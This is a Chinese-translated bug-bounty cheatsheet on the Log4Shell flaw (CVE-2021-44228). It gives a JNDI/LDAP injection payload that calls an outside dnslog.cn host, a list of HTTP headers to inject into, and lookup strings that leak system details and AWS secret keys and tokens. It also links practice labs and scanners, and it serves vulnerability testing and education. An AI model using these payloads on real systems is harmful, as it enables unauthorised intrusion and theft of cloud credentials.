<html>
<head>
<title>Log4j Vulnerability Cheatsheet</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Log4j漏洞说明书</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/log4j-vulnerability-cheatsheet-66b7aeabc607?source=collection_archive---------2-----------------------#2021-12-14">https://infosecwriteups.com/log4j-vulnerability-cheatsheet-66b7aeabc607?source=collection_archive---------2-----------------------#2021-12-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="0062" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">它是如何工作的，在哪里练习，以及如何识别</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi ko"><img src="../Images/ad6275cc2dd405294c9b3bdf76d43103.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1myKN69NDgLOP6WinRFe_g.png"/></div></div><figcaption class="la lb gj gh gi lc ld bd b be z dk translated">Bug赏金提示::Log4j漏洞备忘单</figcaption></figure><h1 id="02df" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">描述</h1><p id="1b6a" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">如果记录用户控制的字符串，Java日志库log4j存在未经验证的RCE漏洞。CVE-2021–44228(日志4外壳)</p><p id="6635" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">受影响的版本— Apache log4j 2.0-beta9 ≤ 2.14.1</p><h1 id="2263" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">它是如何工作的</h1><p id="91ca" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">特制的有效负载被注入到标头、输入字段或查询/正文参数中</p><pre class="kp kq kr ks gt mh mi mj mk aw ml bi"><span id="f128" class="mm lf it mi b gy mn mo l mp mq"><a class="ae mr" href="https://target.com/?test=${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.qwe3er.dnslog.cn/exp}" rel="noopener ugc nofollow" target="_blank">https://target.com/?test=${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.qwe3er.dnslog.cn/exp}</a></span></pre><p id="f3ac" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">1.您可以使用服务<code class="fe ms mt mu mi b">dnslog.cn</code>为测试创建您的DNS子域。示例:<code class="fe ms mt mu mi b">qwe3er.dnslog.cn</code></p><p id="0174" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">2.使用这个子域创建一个有效负载，并随请求一起发送。一段时间后检查对DNS服务的请求，以确认成功回拨</p><p id="69a9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">3.您应该会收到一个类似的DNS服务请求(主机和Java版本):<code class="fe ms mt mu mi b">jv-11.0.13-hn-73a957d15746.qwe3er.dnslog.cn</code></p><h1 id="443d" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">测试环境</h1><p id="fe7f" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">您可以使用提供的测试环境来检查此漏洞的行为</p><div class="mv mw gp gr mx my"><a href="https://github.com/leonjza/log4jpwn" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">GitHub-Leon jza/log 4 jpwn:log4j rce测试环境和poc</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">log4j rce测试环境参见:https://www.lunasec.io/docs/blog/log4j-zero-day/使用包含的python poc</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">github.com</p></div></div><div class="nh l"><div class="ni l nj nk nl nh nm ky my"/></div></div></a></div><div class="mv mw gp gr mx my"><a href="https://github.com/christophetd/log4shell-vulnerable-app" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">GitHub-Christophe TD/log 4 shell-vulnerable-app:Spring Boot web应用程序易受…</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">此存储库包含易受CVE攻击的Spring Boot web应用程序-2021-44228，昵称为Log4Shell。它使用Log4j…</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">github.com</p></div></div><div class="nh l"><div class="nn l nj nk nl nh nm ky my"/></div></div></a></div><h1 id="62d3" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">挑战和实验室(房间)</h1><p id="a6d4" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">您可以使用创建的挑战、实验室(房间)来练习此漏洞</p><div class="mv mw gp gr mx my"><a href="https://pentesterlab.com/exercises/log4j_rce/course" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">Log4j RCE</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">这个挑战涵盖了Log4j中最新的RCE</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">pentesterlab.com</p></div></div><div class="nh l"><div class="no l nj nk nl nh nm ky my"/></div></div></a></div><div class="mv mw gp gr mx my"><a href="https://tryhackme.com/room/solar" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">TryHackMe | Solar，利用log4j</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">探索CVE-2021-44228，log4j中的一个漏洞，它几乎影响了世界上所有的软件。</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">tryhackme.com</p></div></div><div class="nh l"><div class="np l nj nk nl nh nm ky my"/></div></div></a></div><h1 id="80f0" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">如何识别(服务)</h1><p id="43ee" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">您可以使用这些网站来为您的有效负载创建DNS地址(令牌)</p><p id="1774" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mr" href="https://canarytokens.org" rel="noopener ugc nofollow" target="_blank">https://canarytokens.org</a>(使用令牌类型:Log4Shell)</p><p id="c6cf" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mr" href="https://dnslog.cn" rel="noopener ugc nofollow" target="_blank">https://dnslog.cn</a></p><p id="9cc3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mr" href="https://app.interactsh.com" rel="noopener ugc nofollow" target="_blank">https://app.interactsh.com</a></p><h1 id="358a" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">如何识别(扫描仪)</h1><p id="6d17" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">您可以使用这些扫描器来检查目标网站是否易受攻击</p><div class="mv mw gp gr mx my"><a href="https://github.com/fullhunt/log4j-scan" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">GitHub - fullhunt/log4j-scan:一个全自动、精确和广泛的扫描器，用于查找log4j…</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">一个全自动，准确，广泛的扫描程序，用于查找易受攻击的log4j主机，支持URL列表…</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">github.com</p></div></div><div class="nh l"><div class="nq l nj nk nl nh nm ky my"/></div></div></a></div><div class="mv mw gp gr mx my"><a href="https://github.com/adilsoybali/Log4j-RCE-Scanner" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">GitHub-adilsoybali/Log4j-RCE-Scanner:Log4j的远程命令执行漏洞扫描程序。</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">使用此工具，您可以在多个位置扫描Apache Log4j上的远程命令执行漏洞CVE-2021-44228</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">github.com</p></div></div><div class="nh l"><div class="nr l nj nk nl nh nm ky my"/></div></div></a></div><h1 id="a1d5" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">可以注入有效载荷的位置列表</h1><p id="ccc4" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">电子邮件标题、用户名、密码、电子邮件地址、文件名、查询/正文、文件内容、文档/图像EXIF或这些标题中的任何一个:</p><pre class="kp kq kr ks gt mh mi mj mk aw ml bi"><span id="bf67" class="mm lf it mi b gy mn mo l mp mq">Authorization<br/>Cache-Control<br/>Cf-Connecting_ip<br/>Client-Ip<br/>Contact<br/>Cookie<br/>Forwarded-For-Ip<br/>Forwarded-For<br/>Forwarded<br/>If-Modified-Since<br/>Originating-Ip<br/>Referer<br/>True-Client-Ip<br/>User-Agent<br/>X-Api-Version<br/>X-Client-Ip<br/>X-Forwarded-For<br/>X-Leakix<br/>X-Originating-Ip<br/>X-Real-Ip<br/>X-Remote-Addr<br/>X-Remote-Ip<br/>X-Wap-Profile<br/>Authorization: Basic<br/>Authorization: Bearer<br/>Authorization: Oauth<br/>Authorization: Token</span></pre><h1 id="1886" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">可以提取什么信息</h1><pre class="kp kq kr ks gt mh mi mj mk aw ml bi"><span id="ec65" class="mm lf it mi b gy mn mo l mp mq">${hostName}<br/>${sys:user.name}<br/>${sys:user.home}<br/>${sys:user.dir}<br/>${sys:java.home}<br/>${sys:java.vendor}<br/>${sys:java.version}<br/>${sys:java.vendor.url}<br/>${sys:java.vm.version}<br/>${sys:java.vm.vendor}<br/>${sys:java.vm.name}<br/>${sys:os.name}<br/>${sys:os.arch}<br/>${sys:os.version}<br/>${env:JAVA_VERSION}<br/>${env:AWS_SECRET_ACCESS_KEY}<br/>${env:AWS_SESSION_TOKEN}<br/>${env:AWS_SHARED_CREDENTIALS_FILE}<br/>${env:AWS_WEB_IDENTITY_TOKEN_FILE}<br/>${env:AWS_PROFILE}<br/>${env:AWS_CONFIG_FILE}<br/>${env:AWS_ACCESS_KEY_ID}</span></pre></div><div class="ab cl ns nt hx nu" role="separator"><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx"/></div><div class="im in io ip iq"><p id="d618" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><em class="nz">继续阅读……</em></p><p id="8292" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔗<a class="ae mr" href="https://therceman.medium.com/how-to-find-your-first-bug-motivation-and-tips-for-bug-bounty-hunting-5e7343066d0c" rel="noopener">如何找到你的第一个Bug:Bug赏金的动机和技巧</a> <br/>🔗<a class="ae mr" href="https://medium.com/bugbountywriteup/350-xss-in-15-minutes-dcb74ad93d5f" rel="noopener">$ 350 XSS 15分钟</a> <br/>🔗<a class="ae mr" href="https://therceman.medium.com/how-to-start-bug-bounty-hunting-94b1ff3dda27" rel="noopener">如何开始Bug赏金狩猎</a></p></div><div class="ab cl ns nt hx nu" role="separator"><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx"/></div><div class="im in io ip iq"><p id="d24a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">P.S .如果你有任何问题或需要进一步的指导，请随时加入我的Discord服务器。你可以联系我和其他有经验的虫子赏金猎人，他们总是愿意帮忙。</p><p id="2dba" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔗<a class="ae mr" href="https://therceman.dev/discord" rel="noopener ugc nofollow" target="_blank">therceman.dev/discord</a></p><p id="98b2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">分享臭虫奖励提示</p><p id="4c65" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔸<a class="ae mr" href="https://linkedin.com/in/therceman" rel="noopener ugc nofollow" target="_blank">LinkedIn.com/in/therceman</a></p><p id="71fb" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔸<a class="ae mr" href="https://twitter.com/therceman" rel="noopener ugc nofollow" target="_blank">Twitter.com/therceman</a></p><p id="e69f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔸<a class="ae mr" href="https://telegram.me/therceman" rel="noopener ugc nofollow" target="_blank">Telegram.me/therceman</a></p><p id="5ad2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔸<a class="ae mr" href="https://tiktok.com/@therceman" rel="noopener ugc nofollow" target="_blank">TikTok.com/@therceman</a></p><p id="ae04" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔸<a class="ae mr" href="https://youtube.com/therceman" rel="noopener ugc nofollow" target="_blank">YouTube.com/therceman</a></p><p id="0cb0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">最诚挚的问候，安东</p></div></div>    
</body>
</html>